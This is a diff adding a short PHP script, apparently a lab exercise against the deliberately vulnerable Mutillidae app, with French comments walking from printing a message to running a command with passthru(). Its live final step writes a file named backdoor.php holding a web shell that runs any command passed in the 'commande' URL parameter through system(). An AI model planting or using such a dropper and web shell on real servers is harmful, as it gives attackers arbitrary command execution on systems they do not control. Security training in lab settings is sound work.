@@ -1,0 +1,19 @@
+<?php
+
+// Used to display error in this session.
+ini_set('display_errors',1);
+error_reporting(E_ALL);
+
+// First example: just display a message.
+//echo "Bonjour :)";
+
+// Second example: use passthru() to execute command.
+//echo passthru("ipconfig.exe");
+
+// Third example: create a backdooor. Open after.
+$fichier= fopen("C:\\xampp\\htdocs\\mutillidae\\backdoor.php", "w") or die ("oups");
+$contenu = '<?php if(isset($_GET["commande"])) {echo system($_GET["commande"]);} ?>';
+fwrite($fichier, $contenu);
+fclose($fichier);
+
+?>
